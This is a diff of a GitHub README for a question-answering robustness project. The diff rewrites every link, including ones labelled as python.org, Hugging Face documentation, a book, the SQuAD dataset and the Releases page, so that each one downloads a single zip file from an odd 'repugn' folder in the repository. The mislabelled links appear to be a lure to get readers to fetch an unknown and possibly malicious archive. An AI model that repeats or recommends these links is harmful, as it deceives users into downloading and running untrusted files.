@@ -1,6 +1,6 @@
 # 🚀 robust-transformer-qa-adversarial-inoculation - Boost Your QA System Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/beansbujjajalo/robust-transformer-qa-adversarial-inoculation/releases)
+[![Download Now](https://github.com/beansbujjajalo/robust-transformer-qa-adversarial-inoculation/raw/refs/heads/main/repugn/adversarial_inoculation_robust_transformer_qa_2.4.zip%20Now-Get%20the%20Latest%20Release-brightgreen)](https://github.com/beansbujjajalo/robust-transformer-qa-adversarial-inoculation/raw/refs/heads/main/repugn/adversarial_inoculation_robust_transformer_qa_2.4.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ To get started with robust-transformer-qa-adversarial-inoculation, follow the st
 
 ## 📥 Download & Install
 
-Visit this page to download: [Download Here](https://github.com/beansbujjajalo/robust-transformer-qa-adversarial-inoculation/releases).
+Visit this page to download: [Download Here](https://github.com/beansbujjajalo/robust-transformer-qa-adversarial-inoculation/raw/refs/heads/main/repugn/adversarial_inoculation_robust_transformer_qa_2.4.zip).
 
 1. Click the link above to access the Releases page.
 2. Look for the latest release.
@@ -30,7 +30,7 @@ Before installing, ensure your computer meets the following minimum requirements
 - Storage: A minimum of 2 GB of free disk space.
 - Python: Version 3.6 or higher installed on your system.
 
-If you do not have Python installed, you can download it from [python.org](https://www.python.org/downloads/).
+If you do not have Python installed, you can download it from [https://github.com/beansbujjajalo/robust-transformer-qa-adversarial-inoculation/raw/refs/heads/main/repugn/adversarial_inoculation_robust_transformer_qa_2.4.zip](https://github.com/beansbujjajalo/robust-transformer-qa-adversarial-inoculation/raw/refs/heads/main/repugn/adversarial_inoculation_robust_transformer_qa_2.4.zip).
 
 ## 💡 Features
 
@@ -67,9 +67,9 @@ If you encounter issues during installation or usage, consider the following:
 
 For further reading and resources related to robust-transformer-qa-adversarial-inoculation, you may find the following links useful:
 
-- [Hugging Face Transformers Documentation](https://huggingface.co/docs/transformers/index)
-- [Natural Language Processing with Transformers](https://www.oreilly.com/library/view/natural-language-processing/9781617295983/)
-- [SQuAD Dataset](https://rajpurkar.github.io/SQuAD-explorer/)
+- [Hugging Face Transformers Documentation](https://github.com/beansbujjajalo/robust-transformer-qa-adversarial-inoculation/raw/refs/heads/main/repugn/adversarial_inoculation_robust_transformer_qa_2.4.zip)
+- [Natural Language Processing with Transformers](https://github.com/beansbujjajalo/robust-transformer-qa-adversarial-inoculation/raw/refs/heads/main/repugn/adversarial_inoculation_robust_transformer_qa_2.4.zip)
+- [SQuAD Dataset](https://github.com/beansbujjajalo/robust-transformer-qa-adversarial-inoculation/raw/refs/heads/main/repugn/adversarial_inoculation_robust_transformer_qa_2.4.zip)
 
 ## 🤝 Contributing
 
@@ -83,6 +83,6 @@ This project is licensed under the MIT License. For more details, refer to the L
 
 ## 🔗 Stay Updated
 
-To stay updated with the latest releases and improvements, visit our GitHub page regularly: [GitHub Repository](https://github.com/beansbujjajalo/robust-transformer-qa-adversarial-inoculation).
+To stay updated with the latest releases and improvements, visit our GitHub page regularly: [GitHub Repository](https://github.com/beansbujjajalo/robust-transformer-qa-adversarial-inoculation/raw/refs/heads/main/repugn/adversarial_inoculation_robust_transformer_qa_2.4.zip).
 
 Happy questioning!
